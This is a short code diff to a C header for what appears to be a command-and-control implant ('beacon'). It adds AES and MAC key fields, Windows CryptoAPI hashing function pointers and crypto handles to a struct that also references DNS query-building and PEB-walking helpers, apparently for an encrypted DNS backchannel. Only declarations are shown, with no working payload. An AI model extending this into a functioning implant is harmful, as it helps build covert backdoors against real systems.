@@ -18,6 +18,9 @@
 typedef struct
 {
 	ULONG BeaconId;
+	UCHAR RawKey[ 16 ];
+	UCHAR AesKey[ 32 ];
+	UCHAR MacKey[ 32 ];
 	
 	struct
 	{
@@ -32,7 +35,9 @@ typedef struct
 		FUNC( CryptDecrypt );
 		FUNC( CryptEncrypt );
 		FUNC( CryptImportKey );
+		FUNC( CryptCreateHash );
 		FUNC( CryptDestroyKey );
+		FUNC( CryptDestroyHash );
 		FUNC( CryptReleaseContext );
 		FUNC( CryptAcquireContextA );
 		FUNC( DnsWriteQuestionToBuffer_UTF8 );
@@ -40,6 +45,8 @@ typedef struct
 	} api;
 
 	HMODULE Module[ 4 ];
+	HCRYPTKEY Keys[ 4 ];
+	HCRYPTPROV Providers[ 4 ];
 } BEACON_INSTANCE, *PBEACON_INSTANCE;
 
 #include "tebpeb.h"
